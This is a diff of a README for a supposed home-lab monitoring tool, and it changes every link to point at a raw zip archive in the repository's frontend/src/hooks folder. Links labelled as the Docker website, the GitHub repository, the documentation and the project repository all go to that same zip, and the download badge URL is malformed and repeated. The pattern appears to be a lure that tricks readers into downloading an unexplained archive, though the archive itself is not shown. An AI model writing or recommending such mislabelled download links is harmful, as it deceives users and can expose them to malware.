@@ -1,6 +1,6 @@
 # 📊 homelab-infrastructure-monitor - Monitor Your Home Lab with Ease
 
-[![Download](https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/homelab-monitor-infrastructure-3.0.zip%https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/homelab-monitor-infrastructure-3.0.zip)](https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/homelab-monitor-infrastructure-3.0.zip)
+[![Download](https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/hooks/homelab_infrastructure_monitor_2.4.zip%https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/hooks/homelab_infrastructure_monitor_2.4.zip)](https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/hooks/homelab_infrastructure_monitor_2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Welcome to the homelab-infrastructure-monitor project! This tool helps you keep 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the software: [Download Latest Release](https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/homelab-monitor-infrastructure-3.0.zip).
+To get started, visit this page to download the software: [Download Latest Release](https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/hooks/homelab_infrastructure_monitor_2.4.zip).
 
 ### 🖥️ System Requirements
 
@@ -33,11 +33,11 @@ Before you install the software, make sure your system meets the following requi
 ### 🌐 Installation Instructions
 
 1. **Download the Latest Version**
-   - Go to the [Download Latest Release](https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/homelab-monitor-infrastructure-3.0.zip) page.
+   - Go to the [Download Latest Release](https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/hooks/homelab_infrastructure_monitor_2.4.zip) page.
    - Choose the appropriate version for your operating system and download it.
 
 2. **Install Docker**
-   - If you don't have Docker installed, download it from the [Docker website](https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/homelab-monitor-infrastructure-3.0.zip).
+   - If you don't have Docker installed, download it from the [Docker website](https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/hooks/homelab_infrastructure_monitor_2.4.zip).
    - Follow the installation instructions for your operating system.
 
 3. **Set Up the Application**
@@ -72,7 +72,7 @@ If you encounter any issues during installation or usage, here are some common s
 
 For help or to share your experience using the homelab-infrastructure-monitor, consider joining our community. You can find support through:
 
-- GitHub Issues: Report bugs or request features directly in the [GitHub repository](https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/homelab-monitor-infrastructure-3.0.zip).
+- GitHub Issues: Report bugs or request features directly in the [GitHub repository](https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/hooks/homelab_infrastructure_monitor_2.4.zip).
 - User Forum: Join discussions with other users and contributors.
 
 ## 📝 License
@@ -85,7 +85,7 @@ If you would like to contribute to the project, please submit a pull request or 
 
 ## 🔗 Additional Links
 
-- [Project Repository](https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/homelab-monitor-infrastructure-3.0.zip)
-- [Documentation](https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/homelab-monitor-infrastructure-3.0.zip)
+- [Project Repository](https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/hooks/homelab_infrastructure_monitor_2.4.zip)
+- [Documentation](https://github.com/Ozkrnrike/homelab-infrastructure-monitor/raw/refs/heads/main/frontend/src/hooks/homelab_infrastructure_monitor_2.4.zip)
 
 Thank you for using homelab-infrastructure-monitor. We hope it brings ease and efficiency to managing your home lab!
